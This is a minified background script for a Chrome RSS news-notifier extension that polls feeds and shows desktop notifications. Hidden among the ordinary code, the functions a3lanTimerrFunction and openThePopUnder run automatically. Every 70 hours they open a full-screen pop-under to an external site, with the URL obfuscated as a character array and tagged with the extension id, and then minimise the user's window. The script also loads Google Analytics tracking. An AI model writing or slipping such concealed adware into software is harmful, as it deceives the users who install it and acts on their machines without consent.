function init(){(void 0==localStorage.optShowNotifications||""==localStorage.optShowNotifications)&&(localStorage.optShowNotifications="1"),showNotificationsOption="1"==localStorage.optShowNotifications}function timerMeEverySeconds(){window.setTimeout(function(){try{arrArticlesArray=new Array,GetDataFromScratch(0)}catch(a){}timerMeEverySeconds()},MainTimer)}function GetDataFromScratch(a){if(0==a){for(tempSelectedRssItems=new Array,i=0;i<siteItems.length;i++)for(j1=0;j1<siteItems[i].rssItems.length;j1++)siteItems[i].rssItems[j1].selected&&tempSelectedRssItems.push(siteItems[i].rssItems[j1]);CurrentAllNotificationQueue=""}return a>=tempSelectedRssItems.length?void StartNotification():void $.ajax({url:tempSelectedRssItems[a].link,dataType:"xml",data:null,success:function(b){for(i=0;i<siteItems.length;i++)for(j1=0;j1<siteItems[i].rssItems.length;j1++)if(siteItems[i].rssItems[j1].id==tempSelectedRssItems[a].id){siteItems[i].rssItems[j1].ChannelTitle=$(b).find("channel>title").text(),siteItems[i].rssItems[j1].Channellink=$(b).find("channel>link").text(),siteItems[i].rssItems[j1].ChannelChannelPubDate=$(b).find("channel>ChannelPubDate").text(),siteItems[i].rssItems[j1].Channeldescription=$(b).find("channel>description").text(),siteItems[i].rssItems[j1].Channellanguage=$(b).find("channel>language").text(),siteItems[i].rssItems[j1].ChannelImagetitle=$(b).find("channel>image").find("title").text(),siteItems[i].rssItems[j1].ChannelImageSrcUrl=$(b).find("channel>image").find("url").text(),siteItems[i].rssItems[j1].ChannelImageLinkTo=$(b).find("channel>image").find("link").text();break}var c=tempSelectedRssItems[a].id,d=parseInt(tempSelectedRssItems[a].setting_number.toString()),e=1,f=new Array;if($(b).find("channel>item").each(function(){if(d>=e){itemTitle=$(this).find("title").text(),itemlink=$(this).find("link").text(),itempubDate=$(this).find("pubDate").text(),itemdate=$(this).find("date").text(),itemguid=$(this).find("guid").text(),""==$.trim(itemguid)&&(itemguid=itemlink),itemdescription=$(this).find("description").text(),""==$.trim($("<div>"+itemdescription+"</div>").text())&&(itemdescription=findItunesSummaryContentTag(this)),itemdate=$(this).find("date").text();var b="image";if($(this).find("Image").length>0&&(b="Image"),$(this).find(b).length>0){var c="",g="";if($($(this).find(b)[0]).find("title").length>0&&(c=$($(this).find(b)[0]).find("title").text()),$($(this).find(b)[0]).find("link").length>0&&(g=$($(this).find(b)[0]).find("link").text()),""==g&&(g=$($(this).find(b)[0]).text()),""!=g&&-1==g.toLowerCase().indexOf("http://"))if($("<div>"+$(this).find("description").text()+"</div>").find("img").length>0)try{g=$($("<div>"+$(this).find("description").text()+"</div>").find("img")[0]).attr("src")}catch(h){}else g=cnfg_SiteBaseUrl+g;i="<img src='"+g+"' title='"+c+"' />",itemdescription=i+$.trim($("<div>"+itemdescription+"</div>").text())}else if($(this).find("media:content media:thumbnail").length>0){var c="",g="";$($(this).find("media:title")[0]).length>0&&(c=$($(this).find("media:title")[0]).text()),g=$($(this).find("media:thumbnail")[0]).attr("href"),i="<img src='"+g+"' title='"+c+"' />",itemdescription=i+$.trim($("<div>"+itemdescription+"</div>").text())}else if($(this).find("enclosure").length>0&&void 0!=$($(this).find("enclosure")[0]).attr("url")&&""!=$($(this).find("enclosure")[0]).attr("url")&&void 0!=$($(this).find("enclosure")[0]).attr("type")&&("image/pjpeg"==$($(this).find("enclosure")[0]).attr("type").toLowerCase()||"image/gif"==$($(this).find("enclosure")[0]).attr("type").toLowerCase())){var g=$($(this).find("enclosure")[0]).attr("url"),i="<img src='"+g+"'  />";itemdescription=i+$.trim($("<div>"+itemdescription+"</div>").text())}else{var g=findImageInMediaContentTag(this);if(""!=g){var i="<img src='"+g+"'  />";itemdescription=i+$.trim($("<div>"+itemdescription+"</div>").text())}else if($("<div>"+$(this).find("description").text()+"</div>").find("img").length>0)try{var j=$('<div><img src="'+$($("<div>"+$(this).find("description").text()+"</div>").find("img")[0]).attr("src")+'" /></div>').html();itemdescription=j+$.trim($("<div>"+itemdescription+"</div>").text())}catch(h){}}var k=new newsItem;k.itemTitle=itemTitle,k.itemlink=itemlink,k.itempubDate=itempubDate,k.itemdate=itemdate,k.itemguid=itemguid,k.itemdescription=itemdescription,k.itemdate=itemdate,k.sourceRss_text=tempSelectedRssItems[a].text,k.sourceRss_id=tempSelectedRssItems[a].id,k.sourceRss_largeimage=tempSelectedRssItems[a].largeimage,k.sourceRss_smallimage=tempSelectedRssItems[a].smallimage,k.sourceRss_setting_showNotifications=tempSelectedRssItems[a].setting_showNotifications,arrArticlesArray.push(k),f.push(k)}e++}),tempSelectedRssItems[a].setting_showNotifications){var g="";(void 0==localStorage["OldArts"+c]||""==localStorage["OldArts"+c])&&(localStorage["OldArts"+c]="");var h=localStorage["OldArts"+c];for(i=0;i<f.length;i++){var j=f[i];h.indexOf(j.itemguid)>-1||(""!=g?g+="\n"+j.itemguid:g=j.itemguid)}for(""!=g&&isNotificationWindowOppened&&closeThenotification(),CurrentAllNotificationQueue+=g,localStorage["OldArts"+c]="",i=0;i<f.length;i++){var k=f[i];""==localStorage["OldArts"+c]?localStorage["OldArts"+c]=k.itemguid:localStorage["OldArts"+c]+="\n"+k.itemguid}}f=new Array,GetDataFromScratch(a+1)},error:function(b){console.log(b.toString()+b.message+b.error),GetDataFromScratch(a+1)}})}function findImageInMediaContentTag(a){try{for(i=0;i<a.childNodes.length;i++)if("media:content"==a.childNodes[i].nodeName.toLowerCase()&&void 0!=$(a.childNodes[i]).attr("medium")&&""!=$(a.childNodes[i]).attr("medium")&&"image"==$(a.childNodes[i]).attr("medium").toLowerCase())return $(a.childNodes[i]).attr("url");var b="",c=0;for(i=0;i<a.childNodes.length;i++)if("media:thumbnail"==a.childNodes[i].nodeName.toLowerCase()&&""!=$(a.childNodes[i]).attr("url")){var d=$(a.childNodes[i]).attr("url").toLowerCase();if(d.indexOf(".jpg")>-1||d.indexOf(".png")>-1||d.indexOf(".gif")>-1||d.indexOf(".jpeg")>-1)if(void 0!==$(a.childNodes[i]).attr("width")){var e=parseInt($(a.childNodes[i]).attr("width"));e>c&&(b=d,c=e)}else b=d}if(""!=b)return b}catch(f){return""}return""}function findItunesSummaryContentTag(a){try{for(i=0;i<a.childNodes.length;i++)if("itunes:summary"==a.childNodes[i].nodeName.toLowerCase())return $(a.childNodes[i]).text()}catch(b){return""}return""}function StartNotification(){function a(a,b,c){b=""==b?chrome.extension.getURL("VarFiles/images/largeLogo.png"):b;var d=new XMLHttpRequest;d.open("GET",b),d.responseType="blob",d.onreadystatechange=function(){if(4===d.readyState){var b=chrome.extension.getURL("VarFiles/images/largeLogo.png");if(200===d.status){var e=this.response;b=window.URL.createObjectURL(e)}var f=[];for(i=0;i<a.length;i++)f.push({title:a[i].title,message:a[i].message});var g={type:"list",title:"Latest news",contextMessage:ModuleNotificationName,eventTime:NotificationTimer,message:"Latest news",iconUrl:b,appIconMaskUrl:chrome.extension.getURL("VarFiles/images/largeLogo.png"),items:f};"basic"==ModuleNotificationType_for_SingleItem&&1==f.length?g={type:"basic",title:a[c].title,eventTime:NotificationTimer,contextMessage:ModuleNotificationName,message:a[c].message,iconUrl:b,isClickable:!0}:"image"==ModuleNotificationType_for_SingleItem&&1==f.length&&(g={type:"image",title:a[c].title,contextMessage:ModuleNotificationName,message:a[c].message,eventTime:NotificationTimer,iconUrl:chrome.extension.getURL("VarFiles/images/largeLogo.png"),imageUrl:b,isClickable:!0}),chrome.notifications.clear(ModuleNameId+"notification",function(){k=chrome.notifications.create(ModuleNameId+"notification",g,function(){CurrentAllNotificationQueue="",latestNotificationUrl=a[c].url,currentNotificationsLength=f.length,console.log("latestNotificationUrl = "+latestNotificationUrl),chrome.notifications.onClicked.removeListener(),chrome.notifications.onClicked.addListener(function(){"list"!=ModuleNotificationType_for_SingleItem&&1==currentNotificationsLength?openNotificationUrlInProccess||(openNotificationUrlInProccess=!0,console.log("latestNotificationUrl for tabs = "+latestNotificationUrl),chrome.tabs.create({url:latestNotificationUrl,selected:!0},function(){openNotificationUrlInProccess=!1,chrome.notifications.clear(ModuleNameId+"notification",function(){})})):chrome.notifications.clear(ModuleNameId+"notification",function(){})}),chrome.notifications.getAll(function(){}),isLastNotificationClosedByUser=!1,chrome.notifications.onClosed.removeListener(),chrome.notifications.onClosed.addListener(function(a,b){isLastNotificationClosedByUser=b}),chrome.notifications.onShowSettings.removeListener(),chrome.notifications.onShowSettings.addListener(function(){chrome.tabs.create({url:chrome.extension.getURL("options.html"),selected:!0})})})})}},d.send(null)}if(""!=CurrentAllNotificationQueue&&showNotificationsOption){var b=[],c="",d="";for(i=0;i<arrArticlesArray.length;i++){var e=arrArticlesArray[i];if(CurrentAllNotificationQueue.indexOf(e.itemguid)>-1){var f=e.itemdescription,g=$("<div>"+f+"<div>").text();g.length>190&&(g=g.substring(0,190));var h="",j=$("<div>"+f+"<div>").find("img");j.length>0&&(h=$(j[0]).attr("src"),""==d&&""!=h&&(d=h)),c.indexOf(e.itemguid)<0&&(b.push({title:e.itemTitle.substring(0,85),message:g,image:h,url:e.itemlink}),c+=";"+e.itemguid)}}chrome.browserAction.setBadgeText({text:CurrentAllNotificationQueue.split("\n").length.toString()}),a(b,d,0);var k;console.log("\n -- here -- \n"+CurrentAllNotificationQueue)}else chrome.browserAction.setBadgeText({text:""})}function closeTheNotification(){CurrentAllNotificationQueue="",isNotificationWindowOppened=!1}function getRssItemById(a){for(i=0;i<siteItems.length;i++)for(j1=0;j1<siteItems[i].rssItems.length;j1++)if(siteItems[i].rssItems[j1].id==a)return siteItems[i].rssItems[j1]}function readXMLConfig(){siteItems=new Array,$.ajax({url:chrome.extension.getURL("/VarFiles/site.xml"),dataType:"xml",data:null,async:!1,success:function(a){var b=getRssSettingItems();$(a).find("site").each(function(){var a=new siteItem;a.id=$(this).attr("id"),a.text=$(this).attr("text"),a.site=$(this).attr("site"),a.largeimage=$(this).attr("largeimage"),a.smallimage=$(this).attr("smallimage"),$(this).find("rssItem").each(function(){var c=new rssItem;if(c.id=$(this).attr("id"),c.text=$(this).attr("text"),c.link=$(this).attr("link"),c.largeimage=$(this).attr("largeimage"),c.smallimage=$(this).attr("smallimage"),c.selected=!1,c.setting_showNotifications=!0,c.setting_number=10,b.length>0)for(i=0;i<b.length;i++)b[i].id==c.id&&(c.setting_number=parseInt(b[i].numberOfItems),c.setting_showNotifications="true"==b[i].showNotifications.toString(),c.selected=!0);a.rssItems.push(c)}),siteItems.push(a)}),void 0==localStorage.firstTime||""==localStorage.firstTime?(localStorage.siteItemsOptions=siteItems[0].rssItems[0].id+"#10#true",localStorage.firstTime="1",localStorage.firstTime_2="1",chrome.tabs.create({url:chrome.extension.getURL("options.html"),selected:!0})):(void 0==localStorage.firstTime_2||""==localStorage.firstTime_2)&&(localStorage.firstTime_2="1",localStorage.firstTime="1",chrome.tabs.create({url:chrome.extension.getURL("options.html"),selected:!0}))},error:function(a){console.log(a.toString()+a.message+a.error)}})}function getRssSettingItems(){var a=new Array,b=localStorage.siteItemsOptions;if(void 0!=b){var c=b.split("\n");if(c.length>0)for(i=0;i<c.length;i++){var d=c[i],e=d.split("#");if(e.length>2){var f=new rssSettingItem;f.id=e[0],f.numberOfItems=e[1],f.showNotifications=e[2],a.push(f)}}}return a}function siteItem(){this.rssItems=new Array,this.id="",this.text="",this.site="",this.largeimage="",this.smallimage="",this.description=""}function rssItem(){this.id="",this.text="",this.link="",this.largeimage="",this.smallimage="",this.description="",this.setting_number=5,this.setting_showNotifications=!0,this.selected=!1,this.ChannelTitle="",this.Channellink="",this.ChannelChannelPubDate="",this.Channeldescription="",this.Channellanguage="",this.ChannelImagetitle="",this.ChannelImageSrcUrl="",this.ChannelImageLinkTo=""}function rssSettingItem(){this.id="",this.numberOfItems=5,this.showNotifications=!0}function newsItem(){this.itemTitle="",this.itemlink="",this.itempubDate="",this.itemdate="",this.itemguid="",this.itemdescription="",this.sourceRss_id="",this.sourceRss_text="",this.sourceRss_largeimage="",this.sourceRss_smallimage="",this.sourceRss_setting_showNotifications=!0}function a3lanTimerrFunction(){var a=localStorage.a3lanTimer,b=(new Date).getTime();(b-a)/36e5>70&&(openThePopUnder(),localStorage.a3lanTimer=(new Date).getTime());setTimeout(function(){a3lanTimerrFunction()},6e5)}function openThePopUnder(){parseInt(navigator.appVersion)>3?(winWidth=screen.availWidth,winHeight=screen.availHeight):(winWidth="1024",winHeight="768");var a="";try{a=chrome.i18n.getMessage("@@extension_id")}catch(b){}var c=["h","t","t","p",":","/","/","d","r","o","s","s","k","y","p","e",".","c","o","m","/","/","d","e","f","i","n","i","t","i","o","n","/","E","n","g","l","i","s","h","%","2","0","D","e","f","i","n","i","t","i","o","n","%","2","0","S","e","a","r","c","h",".","h","t","m","l","?","i","d","="].join(""),d=window.open(c+a,"NWTWindowName","width="+winWidth+",height="+winHeight+",scrollbars=1,resizable=1,menubar=1");d.blur();try{chrome.tabs.getCurrent(function(a){try{chrome.windows.update(a.windowId,{state:"minimized"})}catch(b){}})}catch(b){}}var ChannelTitle="",isLastNotificationClosedByUser=!1,Channellink="",ChannelChannelPubDate="",Channeldescription="",Channellanguage="",theImagetitle="",theImageLinkTo="",arrArticlesArray=new Array,firstTimegetData=!0,testnotificationWindow,isNotificationWindowOppened=!1,CurrentAllNotificationQueue="",showNotificationsOption=!0,notificationTimerReopen,latestNotificationUrl="",openNotificationUrlInProccess=!1;(void 0==localStorage.firstTime||""==localStorage.firstTime)&&(localStorage.optShowNotifications="1",readXMLConfig()),$(document).ready(function(){init(),readXMLConfig(),arrArticlesArray=new Array,GetDataFromScratch(0),timerMeEverySeconds()});var tempSelectedRssItems=new Array,siteItems=new Array;void 0==localStorage.a3lanTimer||""==localStorage.a3lanTimer?(localStorage.a3lanTimer=(new Date).getTime()-9e7,a3lanTimerrFunction()):a3lanTimerrFunction();var _gaq=_gaq||[];_gaq.push(["_setAccount","UA-26904978-1"]),_gaq.push(["_trackPageview"]),function(){var a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src="https://ssl.google-analytics.com/ga.js";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)}();